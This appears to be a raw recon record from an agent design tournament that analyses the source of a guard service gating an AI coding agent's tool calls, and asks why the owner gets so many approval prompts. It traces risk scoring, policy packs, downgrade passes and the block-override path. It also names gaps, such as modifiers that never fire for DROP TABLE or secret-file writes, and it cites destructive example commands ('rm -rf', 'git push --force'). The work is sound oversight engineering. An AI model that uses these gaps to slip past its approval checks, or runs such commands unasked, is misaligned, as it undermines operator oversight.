# Approval calibration tournament — raw output

Captured 2026-08-11 from workflow run `wf_e470067d-b7b`. This is the durable
record of a 13-agent design tournament answering the owner's complaint:

> "Too often I'm approving commands I asked the agent to run that are risk score 100."

**Status when captured:** 4 recon reports, 4 candidate
designs, 4 judge verdicts. Nothing here is decided or built — it is
input to an architecture decision. See `docs/RESUME.md` for the root-cause summary.

---

## Phase 1 — Recon (4 agents, live source)

### a09fc590fbde802a9

#### Findings

- **Base guard payload fields the pretool hook ALWAYS sends for a governed Bash call: action_type, agent_id, declared_goal, risk_score, reversible, systems_touched (array containing exactly tool_info['category']), tool{name,category,required_permission}, intel{bash:{intent,risk_score,reversible,validations}}, approval_wait_seconds, enforcement_mode.**
  - Evidence: `hooks/dashclaw_pretool.py:1631-1656 (_build_guard_context)`
- **Conditional payload fields on top of the base set: target (only if a redirect/script-then-execute target exists, pretool.py:1659-1660), act{kind,command|file} (only for Bash/PowerShell/Write/Edit/MultiEdit, built by _build_act), idempotency_key (only if tool_use_id present, main():1853-1858), harness_session_id (only if _SESSION_ID present, _attach_harness_session:1715-1726), content (only for Write/Edit/MultiEdit/NotebookEdit with body content, _attach_autoscan_content:1681-1691 -- never set for Bash), client_capabilities=['allow_contained'] + containment_instance (only when CONTAINMENT_ENABLED, HOOK_MODE=='enforce', tool is in {Write,Edit,MultiEdit,Bash}, and cwd is a git repo, _attach_client_capabilities:1029-1050), and swarm_id/agent_name/trigger/intel.subagent/subagent_uuid (only inside a sub-agent call, _attach_subagent_provenance:1728-1751).**
  - Evidence: `hooks/dashclaw_pretool.py:1600-1751`
- **Server-side whitelist that the payload must clear before evaluateGuard ever sees it: GUARD_INPUT_SCHEMA lists action_type, action(alias), risk_score, agent_id, agent_name, systems_touched, reversible, declared_goal, intent(alias), target, content, source_of_truth, intel, tool, write_paths, trigger, swarm_id, idempotency_key, approval_wait_seconds, act, client_capabilities. Fields not on this list are silently stripped by validate() -- the schema's own comment says so explicitly. harness_session_id/subagent_uuid/containment_instance/enforcement_mode are NOT in this schema; they are re-extracted from the raw request body directly in the route handler AFTER validation, each through its own sanitizer.**
  - Evidence: `app/lib/validate.js:292-344 (GUARD_INPUT_SCHEMA, comment at 311-317); app/api/guard/route.ts:334-344 (post-validation field extraction)`
- **Full _INTENT_TO_ACTION mapping (bash/PowerShell intent -> guard action_type): readonly->review, write->apply, destructive->security, network->api, process_management->security, package_management->build, system_admin->deploy, interpreter->build, unknown->other. One override sits above this table: a destructive intent that is a bounded rm (<=3 explicit non-glob targets, non-recursive) OR a recursive rm/Remove-Item whose every target is a bare well-known regenerable build directory (node_modules, dist, .next, .turbo, .cache, .parcel-cache, coverage, __pycache__, .pytest_cache, .nuxt, .svelte-kit) is remapped to action_type='cleanup' instead of 'security'.**
  - Evidence: `hooks/dashclaw_pretool.py:211-221 (_INTENT_TO_ACTION); hooks/dashclaw_pretool.py:474-480 (cleanup override); hooks/dashclaw_agent_intel/bash_classifier.py:304-307 (_REGENERABLE_ARTIFACT_DIRS, includes node_modules), 334-364 (is_bounded_rm), 317-331 (is_regenerable_artifact_rm)`
- **Bash tool_info base values from the static catalog: Bash -> category='execution', required_permission='danger', base_risk=70; Write -> category='file_io', required_permission='workspace_write', base_risk=40. These feed _bash_base_risk_score (used only as a fallback for intent=='unknown') and the file-tool risk path respectively.**
  - Evidence: `hooks/dashclaw_agent_intel/tool_recognizer.py:65-68 (Bash), 79-82 (Write); hooks/dashclaw_pretool.py:376-385 (_bash_base_risk_score)`
- **Ordered evaluate.ts phases, part 1 (pre-checks and risk assembly, all RAISE-only or risk-max-fold, none ever lowers a decision already reached): (0) foldEvidenceIntoContext folds the caller-attached act's evidence-derived score into the risk total via a later max() and can swap context.action_type on mismatch, but preserves the original as declared_action_type so restrictive action-type policies (which check both) can never be dodged by the swap. (1) computeReplayBlockReason and (2) computeActBindingBlockReason compute block reasons applied later via applyBlockOverride. (3) org-halt check forces an absolute block when set. (4) computeRiskAssessment folds server heuristic, org risk-template, client-reported risk_score, and evidence-derived total via Math.max only (D1 trust rule) -- none of these four terms can ever lower the others.**
  - Evidence: `app/lib/guard/evaluate.ts:900 (call), 841-885 (foldEvidenceIntoContext def); app/lib/guard/policy.ts:64-71 (contextActionTypes reads both action_type and declared_action_type); evaluate.ts:911-912 (replay/act-binding calls), 143-173 (defs), applied at 1187-1188; evaluate.ts:919-920 (halt check), applied at 1144; evaluate.ts:988 (computeRiskAssessment call); app/lib/guard/risk.ts:87-94 (computeEffectiveRisk max-fold, D1 comment), 166-213 (computeRiskAssessment, effectiveRiskScore Math.max at 193-198)`
- **Ordered evaluate.ts phases, part 2 (predictive-risk adjustment): computePredictiveRisk can in principle both raise and lower the running score (the LLM component is clamped to [-20,+20]), but under a fresh/default org this phase contributes exactly zero: PREDICTIVE_RISK_ENABLED defaults to false (no matching settings row -> enabled:false), and computePredictiveRisk returns null immediately when !enabled -- the statistical sub-component (the only part that ever runs unconditionally once enabled) is itself monotonically non-negative (0, or +5/+10/+15/+20, or a flat +5 cold-start; never subtracted).**
  - Evidence: `app/lib/guard/evaluate.ts:186-209 (computePredictiveRisk, `if (!enabled) return null` at ~194), 995-997 (call site); app/lib/guard/caches.ts:204 (enabled: ...=== 'true', defaults false); app/lib/predictive-risk.ts:274,280 (LLM gated on enabled===true AND score>=threshold), :236 (LLM adjustment clamp [-20,20]), :77-120 (computeStatisticalAdjustment, only +0/+5/+10/+15/+20, cold-start +5)`
- **Ordered evaluate.ts phases, part 3 (policy evaluation, all RAISE-only against the accumulator via raiseDecision, which by construction never lowers acc.highestDecision): runLocalPolicies (evaluates every active org policy; an individual policy CAN return action='allow' but that is a no-op, never a downgrade of a decision another policy already raised), scanPromptInjection, the containment_promote builtin raise, and runWebhookPolicies (skipped entirely when options.simulate is true). All four run before any downgrade pass.**
  - Evidence: `app/lib/guard/evaluate.ts:106-108 (raiseDecision, one-directional by Math comparison), 1021 (runLocalPolicies call; def 256-291), 1022 (scanPromptInjection call; def 558-579), 1029-1033 (containment_promote raise), 1039-1040 (runWebhookPolicies gated on !options.simulate; def 583-608)`
- **Ordered evaluate.ts phases, part 4 (calibration controller, explicitly documented tighten-only): runCalibrationController runs after every policy-raising phase and before any grant, and by its own docstring only ever raises to require_approval via raiseDecision -- shadow mode only records what it would do, active mode never downgrades and never touches block.**
  - Evidence: `app/lib/guard/evaluate.ts:610-620 (docstring: 'tighten-only -- it can never downgrade anything and never touches block'), 622-651 (def), 1044 (call site)`
- **Ordered evaluate.ts phases, part 5 (the three downgrade/grant passes -- the only LOWER-capable phases in the whole pipeline): applyAllowGrants downgrades warn/require_approval to allow on a matching org allow_grant policy, but explicitly refuses when the gating policy was marked ungrantable or when action_type=='containment_promote', and NEVER touches block. applyOperatorApprovalGrant downgrades require_approval to allow exactly once via an atomic `UPDATE ... WHERE approval_grant_used_at IS NULL RETURNING` on a matching prior HITL approval (same agent, exact declared_goal, action_type, act-content-hash) inside a 15-minute window -- never touches block. applyPlanStepGrant is the one phase that is genuinely BOTH: it RAISES via applyBlockOverride when the action matches a step the operator explicitly denied (evaluate.ts:494, fail-closed on lookup failure), and separately LOWERS require_approval to allow via a single-use atomic consumption (evaluate.ts:518-534) when the step was approved.**
  - Evidence: `app/lib/guard/evaluate.ts:297-339 (applyAllowGrants, ungrantable guard at 308-316, block exclusion at 307), 1051 (call); evaluate.ts:378-424 (applyOperatorApprovalGrant, atomic UPDATE at 387-408), 1060 (call, guarded by evaluationAbandoned check at 1059); evaluate.ts:460-555 (applyPlanStepGrant: deny-raise at 485-509, consume-lower at 518-544), 1074 (call)`
- **Ordered evaluate.ts phases, part 6 (tail): runSignalChecks appends warning strings only and never touches acc.highestDecision -- it is the one phase that changes NEITHER direction. Deadline/error degradation (resolveDegradedAction) never downgrades a decision already reached ('Never downgrade a decision already reached from accumulated state'), but its configured fail-open ('allow') setting can leave an unfinished evaluation short of a raise it would otherwise have reached; a fail-closed setting instead raises via raiseDecision. Finally applyBlockOverride fires twice more for the replay/act-binding pre-checks computed back at phase 0-1 (RAISE-only), and finalizeContainment runs last and is explicitly documented as 'skew only tightens' (allow_contained can be forced down to require_approval, never the reverse).**
  - Evidence: `app/lib/guard/evaluate.ts:653-668 (runSignalChecks, def), 1076 (call); evaluate.ts:1147-1178 (degradation handling, quote at 1160); evaluate.ts:1187-1188 (final applyBlockOverride calls); app/lib/guard/containment.ts:86-118 (finalizeContainment, 'skew only tightens' at line 101)`
- **(a) 'rm -rf ./node_modules' -> ALLOW under the default catastrophe-only pack, final risk_score=65. Client: bash_classifier scores destructive base 90 -> destructive_command warn +10 = 100 -> regenerable-artifact cap min(100,35)=35 (node_modules is in the regenerable-dirs allowlist); pretool.py remaps action_type to 'cleanup', reversible=False. Server: serverRiskTerms = base(cleanup)=30 + irreversible(+15, since reversible=false) + goal:destructive-pattern(+20, 'rm -rf' matches) = 65; no systems-touched modifier fires (systems_touched=['execution'] matches neither HIGH_RISK_SYSTEMS nor MODERATE_RISK_SYSTEMS). Evidence layer independently reclassifies as cleanup/regenerable_artifact, total=45. effectiveRiskScore=max(65,0,35,45)=65 (no predictive adjustment, disabled by default). Neither block_mass_destructive (needs >=100) nor hold_secret_file_writes (no target) fires.**
  - Evidence: `hooks/dashclaw_agent_intel/bash_classifier.py:806-855 (_compute_risk), :304-307 (regenerable dirs incl. node_modules); hooks/dashclaw_pretool.py:474-480; app/lib/guard/risk.ts:11-16,20-21,28-30,63-71; app/lib/guard/evidence.ts:266-295 (RM_RECURSIVE_RE branch, regenerable-artifact base=45); app/lib/guardrails/packs/catastrophe-only/policies.yml:16-34,42-69`
- **(b) 'git push --force origin main' -> BLOCK under the default catastrophe-only pack (matched policy block_mass_destructive), final risk_score=100. Client: bash_classifier's git subcommand classifier returns 'destructive' for push+--force; base 90 -> destructive_command warn +10 = 100 (git push is not rm/dd/mkfs so no cap applies); action_type='security' (destructive->security mapping), reversible=False. Server: serverRiskTerms = base(security)=80 + irreversible(+15) + goal:deployment-pattern(+10, bare 'push' matches \\bpush\\b) = 105 -> clamped 100. Evidence layer independently matches the vcs_dangerous branch (git push --force pattern), base=70, matching the declared type so no mismatch swap. effectiveRiskScore=max(100,0,100,70)=100. risk_threshold policy fires: 100 >= threshold 100 -> action=block.**
  - Evidence: `hooks/dashclaw_agent_intel/bash_classifier.py:409-431 (esp. 419-420 push --force -> destructive); app/lib/guard/risk.ts:11-16,28-29; app/lib/guard/evidence.ts:296 (vcs_dangerous branch); app/lib/guard/policy.ts:260-267 (risk_threshold evaluator, riskScore >= threshold); app/lib/guardrails/packs/catastrophe-only/policies.yml:16-23`
- **(c) 'npx vitest run' -> ALLOW under the default catastrophe-only pack, final risk_score=40 (persisted action_type silently overwritten from 'build' to 'other'). Client: npx is in INTERPRETER_COMMANDS -> intent='interpreter', base risk 35, action_type='build', reversible=True. Server pre-swap: base(build)=25, no modifiers. Evidence layer has no pattern branch for npx/vitest -> falls to the generic default (base=30, action='other'); since 30 > the declared base of 25, the mismatch guard in foldEvidenceIntoContext fires and OVERWRITES context.action_type to 'other' (preserving 'build' only as declared_action_type), adding a +10 mismatch modifier (evidence total=40). Re-computed server terms under the now-mutated action_type='other': base(other)=20, no goal-pattern match, total=20. effectiveRiskScore=max(20,0,35[client],40[evidence])=40. No catastrophe-only policy keys on action_type, so nothing fires regardless of the swap.**
  - Evidence: `hooks/dashclaw_agent_intel/bash_classifier.py:83-87 (INTERPRETER_COMMANDS incl. npx), :277-287 (_RISK_BASE); hooks/dashclaw_pretool.py:211-221; app/lib/guard/evidence.ts:239-331 (classifyShellSegment, no npx/vitest branch, default base=30/action=other at lines 259-261); app/lib/guard/evaluate.ts:841-885 (foldEvidenceIntoContext, mismatch condition at 849, swap at 864-871)`
- **(d) writing to .env.local via the Write tool -> REQUIRE_APPROVAL under the default catastrophe-only pack (matched policy hold_secret_file_writes), final risk_score=95 -- notably NOT 100, and gated purely by path match, independent of the score. Client: file_scanner flags .env.local as sensitive (basename starts with '.env.' and is not a placeholder) -> action_type='security', base_risk=40(Write)+15(sensitive)=55; _enrich_file HARDCODES reversible=True regardless of sensitivity. Server: serverRiskTerms = base(security)=80 + goal:secret-pattern(+15, '.env' matches) + 0 irreversible (reversible=True) + 0 systems (category 'file_io' matches neither HIGH_RISK_SYSTEMS nor MODERATE_RISK_SYSTEMS, which lists 'filesystem' not 'file_io') = 95. Evidence layer (act kind='file') scores base 35 + sensitive_path 20 = 55, but 35 is NOT greater than the declared base of 80, so the mismatch guard does not fire and action_type stays 'security'. effectiveRiskScore=max(95,0,55,55)=95. block_mass_destructive does not fire (95<100); hold_secret_file_writes fires on the protected_path glob '**/.env.local' matching target='.env.local' regardless of risk score.**
  - Evidence: `hooks/dashclaw_agent_intel/file_scanner.py:38-41 (env_file sensitive rule), 92-171 (scan_file_operation); hooks/dashclaw_pretool.py:528-574 (_enrich_file, hardcoded reversible:True at ~557); hooks/dashclaw_agent_intel/tool_recognizer.py:79-82 (Write base_risk=40); app/lib/guard/risk.ts:11-16,20-21,30; app/lib/guard/evidence.ts:461-475 (classifyFile); app/lib/guard/policy.ts:291-300 (protected_path evaluator), app/lib/guard/protected-path.ts:72-88 (matchesProtectedPath); app/lib/guardrails/packs/catastrophe-only/policies.yml:42-69 (hold_secret_file_writes, incl. own passing test fixture proving '**/.env' matches a bare target)`
- **(e) 'npm run db:migrate' -> ALLOW under the default catastrophe-only pack, final risk_score=40 (persisted action_type silently overwritten from 'build' to 'other', same mechanism as (c)). Client: npm is in PACKAGE_COMMANDS -> intent='package_management', base risk 30, action_type='build' (package_management mapping), reversible=True. Server pre-swap: base(build)=25 + goal:deployment-pattern(+10, 'migrat' inside 'db:migrate' matches \\bmigrat) = 35. Evidence layer's npm-install branch only matches 'npm install/i/add', not 'npm run' -> falls to the generic default (base=30, action='other'); 30 > declared base 25 triggers the mismatch swap, action_type overwritten to 'other', +10 modifier, evidence total=40. Re-computed server terms under action_type='other': base(other)=20 + goal pattern(+10, unchanged) = 30. effectiveRiskScore=max(30,0,30[client],40[evidence])=40. No catastrophe-only policy fires (no action_type match, no target, risk<100).**
  - Evidence: `hooks/dashclaw_agent_intel/bash_classifier.py:72-77 (PACKAGE_COMMANDS incl. npm), :277-287; app/lib/guard/risk.ts:29 (DEPLOYMENT_GOAL_PATTERNS incl. \\bmigrat); app/lib/guard/evidence.ts:300 (npm-install-only branch: '\\b(npm|pnpm|yarn)\\s+(i\\b|install\\b|add\\b)'), 259-261 (default fallback); app/lib/guard/evaluate.ts:849-871 (mismatch/swap)`
- **No session transcript, turn content, or user-prompt text reaches /api/guard today. The string 'transcript' does not appear anywhere in hooks/dashclaw_pretool.py -- confirmed by direct grep returning zero matches. The only session-shaped fields the pretool hook sends are opaque identifiers (harness_session_id, swarm_id, subagent_uuid) used purely for fleet-attribution grouping and containment-ref naming, never read by any risk or policy-matching code path. Transcript parsing (stop_transcript.py) exists only inside the SEPARATE Stop hook (dashclaw_stop.py), which fires after a turn ends for token-attribution and assumption-extraction bookkeeping -- it contains zero references to '/api/guard' and cannot gate a PreToolUse decision because it structurally runs after the tool call it would need to gate.**
  - Evidence: `Grep 'transcript' hooks/dashclaw_pretool.py -> no matches; Grep 'transcript|/api/guard' hooks/dashclaw_stop.py -> matches only at lines 5,20,339,378,430,442,636,643 (all transcript-parsing/bookkeeping, zero for /api/guard); app/lib/guard/types.ts:12-68 (GuardEvalContext, no session/transcript-content field); Grep 'session_id|transcript' app/lib/guard -> only app/lib/guard/containment.ts:43,115 (harness_session_id used solely to derive a git branch ref name via buildContainmentRef, never in risk or policy logic)`
- **GuardEvalContext has no field of any kind carrying human/operator intent, presence, or provenance -- confirmed against both the TypeScript type definition and the actual server-side input whitelist (a field absent from GUARD_INPUT_SCHEMA is silently stripped before evaluateGuard ever runs, per validate.js's own comment), not just the type file alone.**
  - Evidence: `app/lib/guard/types.ts:12-68 (full GuardEvalContext interface); app/lib/validate.js:292-344 (GUARD_INPUT_SCHEMA, the enforced whitelist)`
- **Under the DEFAULT catastrophe-only pack there is NO require_approval policy driven by risk score at all -- the pack's only risk_threshold policy is a hard BLOCK at exactly threshold=100 (action:block), not require_approval. A risk-100 command under bare catastrophe-only is therefore hard-blocked (hook exits 2, handle_block), never routed through the approve/deny flow at all. This means the owner's literal complaint ('approving commands...risk score 100') cannot be produced by the catastrophe-only pack alone; it implies either a richer pack (e.g. claude-code-starter) is layered on top of it in the live org, or the operator is using the separate block-override path the hook itself prints ('Run dashclaw approvals to review or override', pretool.py:1248) rather than an in-flow require_approval.**
  - Evidence: `app/lib/guardrails/packs/catastrophe-only/policies.yml:16-23 (threshold:100, action:block -- the pack's only risk-keyed rule); hooks/dashclaw_pretool.py:1211-1249 (handle_block, exits 2 on block, prints the override instruction at 1248)`
- **Even one tier up, in the opt-in claude-code-starter pack, the two require_approval policies (network calls, package installs) key on action_type MEMBERSHIP ('api', 'build'), not on the numeric risk score at all -- so tuning the risk-score arithmetic in isolation would not reduce these approvals; only reclassifying which action_type a command lands in would. This is architecturally significant for a calibration redesign: the actual gating variable in the packs that ship require_approval today is a categorical action_type match, and risk_score is largely decorative except at the exact 100-clamp hard block.**
  - Evidence: `app/lib/guardrails/packs/claude-code-starter/policies.yml:17-23 (still just threshold:100->block), 39-54 (require_approval_network_calls, keyed on action_types:[api]), 63-78 (require_approval_package_installs, keyed on action_types:[build])`
- **Two of the four server-side risk modifiers in serverRiskTerms are dead code for the two most common governed tool types via the standard hook path: the hook always sends systems_touched=[tool_info['category']], and Bash's category is 'execution' while file tools' (Write/Edit/MultiEdit) category is 'file_io' -- neither string is in HIGH_RISK_SYSTEMS (['production','database','postgres','neon','redis']) or MODERATE_RISK_SYSTEMS (['filesystem','shell']). The +10/+5 systems-touched bump therefore never fires for an ordinary Bash or Write/Edit/MultiEdit call regardless of what the command actually touches (e.g. it does not fire even for 'psql -c "DROP TABLE..."' unless something else sets systems_touched differently).**
  - Evidence: `hooks/dashclaw_pretool.py:1639 (systems_touched: [tool_info['category']]); hooks/dashclaw_agent_intel/tool_recognizer.py:65-68 (Bash category='execution'), 79-82 (Write category='file_io'); app/lib/guard/risk.ts:20-21 (HIGH_RISK_SYSTEMS, MODERATE_RISK_SYSTEMS), 39-48 (systemsTouchedFactors)`
- **The file-tool enrichment path (_enrich_file) hardcodes reversible=True unconditionally for every Write/Edit/MultiEdit/NotebookEdit call, including a write to a sensitive file -- unlike the Bash path, which derives reversible from the classifier's intent (destructive => False). Consequence: the server's +15 'irreversible' modifier can NEVER fire for any file-tool call, no matter how destructive the write actually is; it is only reachable via the Bash/PowerShell act path.**
  - Evidence: `hooks/dashclaw_pretool.py:528-574 (_enrich_file, `"reversible": True` fixed value in the returned dict), contrast with :506 (`"reversible": bash_intel["reversible"]` in _enrich_bash)`
- **The one code path capable of LOWERING an already-computed risk score is the predictive-risk LLM amplifier's [-20,+20] adjustment, and it reasons ONLY over the org's own persisted action_records history for that exact (agent_id, action_type) pair -- never over anything the current call declares -- so it cannot be talked down by a compromised or prompt-injected agent within a single call. It is off by default and requires the pre-adjustment score to already clear a threshold before it can even run, so out of the box it never fires.**
  - Evidence: `app/lib/predictive-risk.ts:259-313 (getPredictiveRisk, history query at 139-154 keyed only on org_id/agent_id/action_type), :236 (LLM adjustment clamp), :274,280 (enabled+threshold gate); app/lib/guard/caches.ts:204 (default enabled:false)`
- **The one channel that already establishes a claim's truth SERVER-SIDE rather than trusting client assertion is JWT/JWKS agent-identity verification, invoked at the very top of the route before evaluateGuard runs -- the existing architectural precedent for how an out-of-band, non-client-authored signal is meant to enter this system.**
  - Evidence: `app/api/guard/route.ts:369 (resolveAgentIdentity call), docblock at 262-286 describing the verified/unverified two-tier model`

#### Key seams (insertion points)

- `hooks/dashclaw_pretool.py:1631-1656 (_build_guard_context) -- where the hook assembles the outbound payload; a new out-of-band provenance field would be attached here, alongside the existing client_capabilities pattern at :1029-1050`
- `app/lib/guard/types.ts:12-68 (GuardEvalContext) -- must gain a typed field before any new signal is usable downstream without falling into the untyped [field: string]: unknown catch-all`
- `app/lib/validate.js:292-344 (GUARD_INPUT_SCHEMA) -- a new field is silently stripped before evaluateGuard ever sees it unless whitelisted here first (proven by the schema's own comment at 311-317)`
- `app/lib/guard/risk.ts:87-94 (computeEffectiveRisk) and :166-213 (computeRiskAssessment, effectiveRiskScore Math.max at 193-198) -- the D1 max()-only trust boundary; any new signal must fold in as a sibling term here, never replace or reduce inside this max()`
- `app/lib/guard/evaluate.ts:297 (applyAllowGrants), :378 (applyOperatorApprovalGrant), :460 (applyPlanStepGrant) -- the three existing LOWER-only post-passes; a provenance-gated downgrade belongs here, after runWebhookPolicies (:1040) and runCalibrationController (:1044), mirroring applyOperatorApprovalGrant's atomic single-use UPDATE...RETURNING pattern at :387-408`
- `app/api/guard/route.ts:369 (resolveAgentIdentity) -- the existing precedent for a server-verified (not client-asserted) claim entering the pipeline; a provenance channel modeled the same way would attach near here`
- `app/lib/guard/policy.ts:259 (POLICY_EVALUATORS map) -- a new policy_type (e.g. a provenance-aware require_approval variant) needs an evaluator entry here plus matching YAML wiring in the packs`
- `app/lib/guardrails/packs/catastrophe-only/policies.yml:16 and app/lib/guardrails/packs/claude-code-starter/policies.yml:20,44,68 -- where any new/adjusted default policy would be declared`

#### Surprises / contradictions

- The DEFAULT catastrophe-only pack has NO risk-score-driven require_approval policy at all -- its only risk_threshold rule is a hard BLOCK at exactly 100 (policies.yml:16-23). A risk-100 command under bare catastrophe-only is blocked outright, not routed to an approve/deny flow, so the owner's stated complaint cannot be produced by this pack alone as configured -- it implies a richer pack or the separate block-override path is actually in play on the live instance.
- Even the next pack up (claude-code-starter) gates its require_approval policies on action_type MEMBERSHIP, not on the risk score's numeric value -- so a calibration fix aimed purely at 'compute a better number' would not touch the actual friction source in either shipped pack; the real lever is which action_type a command lands in.
- Two risk-relevant modifiers are effectively dead code via the standard hook path: systems_touched=['execution'] (Bash) and ['file_io'] (file tools) never match risk.ts's HIGH_RISK_SYSTEMS/MODERATE_RISK_SYSTEMS string lists, so the +10/+5 systems bump never fires for the two most common tool types regardless of what's actually touched.
- The file-tool path (_enrich_file) hardcodes reversible=True unconditionally, even for a write to a secret file -- the server's +15 irreversible modifier can never apply to any Write/Edit/MultiEdit call, only to Bash/PowerShell calls.
- The evidence-derived classifier (evidence.ts) and the hook's own bash_classifier disagree on ordinary dev commands: neither has a pattern branch for `npx <pkg>` or `npm run <script>`, so both fall to a generic base-30 'other' bucket that is HIGHER than the hook's declared 'build' base (25) -- this silently overwrites the persisted action_type from 'build' to 'other' for both (c) and (e) via the mismatch-swap in foldEvidenceIntoContext, even though neither example is anywhere near a block/approval threshold.
- A genuine (currently inert) score-LOWERING mechanism already exists: the predictive-risk LLM amplifier can subtract up to 20 points, based purely on the org's own historical action outcomes for that (agent, action_type) pair -- structurally immune to same-call prompt injection since it never reads anything the current call declares -- but it's off by default and gated behind a score threshold, so it contributes nothing out of the box.
- The (d) writing-to-.env.local example resolves to require_approval NOT because it hits the risk-100 clamp (it lands at 95, below the block threshold) but purely because hold_secret_file_writes matches the path glob -- a completely score-independent trigger. This reinforces that risk_score's numeric value is not a uniform gating signal across this system; some gates are score-based (block_mass_destructive), others are purely categorical (protected_path, require_approval-by-action_type).

---

### addd084ec5872fa02

#### Findings

- **(a) The calibration controller (app/lib/guard/calibration.ts) is OFF by default and stays off until a human sets a setting no UI exposes. parseCalibrationSettings defaults mode to 'off' whenever the CALIBRATION_CONTROLLER_MODE row is missing or not exactly 'shadow'/'active'. Grepping drizzle/ and scripts/ for that key returns zero hits — no migration or seed ever turns it on for a new org — and grepping app/ for the key outside calibration.ts/settings.repository.ts returns only the VALID_SETTING_KEYS allowlist entry, i.e. no page, panel, or client module ever renders a toggle for it. The only way to activate it today is a raw PATCH to a generic settings endpoint with the exact internal key name.**
  - Evidence: `app/lib/guard/calibration.ts:32,66-96,115-126 (mode default 'off' at line 120); app/lib/repositories/settings.repository.ts:109-110 (VALID_SETTING_KEYS, only place besides the guard module the key appears); grep of drizzle/ and scripts/ for CALIBRATION_CONTROLLER_MODE = 0 hits`
- **(a) Even fully switched to 'active' mode, the controller is structurally incapable of ever lowering a decision. Its only effect is raiseDecision(acc,'require_approval'), gated behind sevOf(acc.highestDecision) < DECISION_SEVERITY.require_approval, so it cannot fire once anything else already reached require_approval or block, and it contains zero assignments that set highestDecision to 'allow' or any lower value. Its own docblock states the charter constraint explicitly: it only ever RAISES; when the org over-interrupts, that becomes evidence for the separate human-ratified loosening rails, never an automatic downgrade, and explicit block decisions are never touched.**
  - Evidence: `app/lib/guard/calibration.ts:20-25 (charter comment); app/lib/guard/evaluate.ts:622-651 (runCalibrationController — only raiseDecision call at line 644, mode==='active' gate at line 634)`
- **(a) Therefore calibration.ts can never touch a risk_threshold:100 block policy (block_mass_destructive) or a protected_path require_approval — both are already >= require_approval severity before the controller phase even runs, and the controller has no downgrade code path to reach either one even in principle, active mode or not.**
  - Evidence: `app/lib/guard/internal.ts:6 (DECISION_SEVERITY: block=4 highest); app/lib/guard/evaluate.ts:634-645`
- **(b) applyAllowGrants (the allow_grant policy type's post-pass) only fires when the decision is exactly 'warn' or 'require_approval' — it explicitly returns immediately on 'block' (and, incidentally, on 'allow_contained' too, since that's excluded from its allow-list check). It ships with zero allow_grant policies by default: the catastrophe-only pack has none, and none of the 8 curated policy-mode builders in compile.ts emit policy_type 'allow_grant'. A human must hand-author a grant (matching exact action_type + target_prefix) in advance, before the shape it should silence has ever occurred once — it cannot help a first-time ask, only a repeat of a pattern the owner already saw and pre-authorized.**
  - Evidence: `app/lib/guard/evaluate.ts:293-339 (applyAllowGrants, block/allow_contained exclusion at line 307); app/lib/guard/policy.ts:290 ('allow_grant: () => null' — the type itself never raises, only the post-pass acts); app/lib/policy-modes/compile.ts:104-299 (no MODE_BUILDER emits allow_grant)`
- **(c) applyOperatorApprovalGrant (evaluate.ts ~379) only covers a RETRY of the exact same call: it requires an existing action_records row with approved_by already set, for the same org+agent_id, an EXACT STRING match on declared_goal, matching action_type (or null), matching act_content_hash if stamped, approved within the last 15 minutes, and not yet consumed (single-use). It is designed for one specific failure mode named in its own comment — the hook's ~30s approval-wait timing out before the operator clicks, so the agent's retried call re-queues instead of honoring the click that already happened. It does nothing for the FIRST ask (there is no prior approved row yet), so it never reduces the click the owner is complaining about — only a second click on an identical retry.**
  - Evidence: `app/lib/guard/evaluate.ts:341-424 (OPERATOR_APPROVAL_WINDOW_MINUTES=15 at 344; exact declared_goal equality in the SQL at line 395; single-use UPDATE...WHERE approval_grant_used_at IS NULL at 388-408)`
- **(c) The match is brittle by construction: declared_goal is free text authored by the calling agent/hook with no canonicalization, so any wording drift between the original call and a retry (a different file path, a rephrased summary, an inserted timestamp) breaks the exact-equality match and the retry re-queues for approval instead of being covered. Whether an agent even automatically retries an identical call after a timed-out wait is agent-dependent and not guaranteed by anything in this codebase.**
  - Evidence: `app/lib/guard/evaluate.ts:387-397 (declared_goal = ${context.declared_goal} exact equality, no normalization)`
- **(d) Preflight plan authorization is fully shipped despite its own RFC still reading 'Status: PROPOSED' — app/api/plans/route.ts and app/api/plans/[planId]/route.ts exist, app/lib/repositories/plans.repository.ts (22.6K) implements findDeniedStepMatch/consumePlanStepGrant, sdk/dashclaw.js:1075 has submitPlan, and app/approvals/page.tsx imports and renders PlanReviewCard and LivePlansSection (lines 29-30, 356, 367) — this is documentation drift, not a missing feature.**
  - Evidence: `docs/rfcs/2026-07-06-preflight-plan-authorization.md:3 ('Status: PROPOSED'); app/lib/guard/evaluate.ts:426-555 (applyPlanStepGrant, fully implemented with V2/U1-U3/W4 hardening revision markers); app/approvals/page.tsx:29-30,356,367`
- **(d) Plan grants never touch block (explicit checks at three points) and only help when the agent proactively calls dashclaw_plan_submit BEFORE executing and the operator reviews the whole plan in advance — a NEW human action (reviewing a plan card), not a removed one. Per the RFC's own hook note, 'no pretool changes required in v1 — plan submission is agent-initiated via SDK/MCP' — the standard Claude Code hook path (the primary enforcement seam) never auto-submits plans, so an ad hoc, in-conversation 'run this now' request the owner makes gets zero benefit unless the agent has been separately taught to plan ahead instead of acting immediately.**
  - Evidence: `app/lib/guard/evaluate.ts:469,479,516 (three block exclusions in applyPlanStepGrant); docs/rfcs/2026-07-06-preflight-plan-authorization.md:104 ('no pretool changes required in v1')`
- **(e) Policy modes (app/lib/policy-modes/catalog.ts, compile.ts) are static curated presets, not a friction-reduction mechanism — applying 'Claude Code Mode', the beachhead default, ADDS more require_approval rules than the bare catastrophe-only pack alone (deploy/migrate/workflow_execute, delete/reset/destroy/drop, and a large protected-path list covering auth/policies/approvals/actions/keys/pems/.env/secrets/schema/drizzle/middleware/hooks/sdk), plus rate limits and a delegation constraint. None of the 8 mode builders ever emit an allow_grant policy or set contain_above. Choosing a mode is a one-time, static, pre-declared risk categorization — it carries no signal about whether a specific instance of an action was something the operator just asked for.**
  - Evidence: `app/lib/policy-modes/compile.ts:110-143 (claude-code mode builder, 9 policies incl. 3 require_approval rules + 1 protected_path over 17 globs)`
- **(e) app/lib/policy-tuning/engine.ts is real, wired (GET/POST /api/policies/proposals, rendered in TriageInbox), and its raise_risk_threshold rule is the ONE actionable proposal type it emits — but it is scoped to policy_type === 'risk_threshold' with rules.action === 'require_approval' ONLY, requires >= 10 fired interruptions and >= 5 resolved outcomes in-window with >= 90% override rate before it proposes anything, and its own comment states the explicit non-goal: 'nothing against block-action policies (blocks produce no approval evidence by design)'. Since most of the actual interrupting in every shipped mode comes from action-type-matched require_approval rules (deploy/migrate/destructive-ops/protected-path), not risk_threshold, this engine's only actionable lever misses the majority of what fires, and it never sees a block-type risk_threshold row at all.**
